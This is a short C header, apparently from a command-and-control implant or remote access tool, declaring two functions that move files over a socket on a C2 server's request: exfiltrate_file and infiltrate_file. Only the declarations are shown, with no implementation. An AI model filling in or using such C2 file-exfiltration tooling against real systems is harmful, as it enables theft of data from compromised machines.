#ifndef ACTIONS_H
#define ACTIONS_H

#include "cnc_prot.h"

void exfiltrate_file(int sockfd, struct cnc_request *req);
void infiltrate_file(int sockfd, struct cnc_request *req);

#endif